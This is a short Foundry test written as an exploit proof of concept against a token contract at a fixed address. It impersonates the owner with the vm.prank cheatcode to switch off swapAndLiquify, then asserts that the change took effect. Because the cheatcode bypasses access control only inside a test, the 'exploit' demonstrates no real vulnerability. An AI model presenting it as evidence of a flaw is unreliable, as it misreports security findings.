pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface RISING {
    function setSwapAndLiquifyEnabled(bool) external;
    function swapAndLiquifyEnabled() external view returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x33555617F481be5973E93b432d8ecEa2D20524be;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll use prank to impersonate owner
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Get the owner address from the constructor
        address owner = 0x26f80C69737107AB4625D04Cd3411CeaD3973D73;

        // Impersonate the owner and disable swapAndLiquify
        vm.prank(owner);
        RISING(TARGET).setSwapAndLiquifyEnabled(false);

        // Verify the state change
        bool enabled = RISING(TARGET).swapAndLiquifyEnabled();
        require(enabled == false, "swapAndLiquifyEnabled should be false");
        assertEq(enabled, false, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

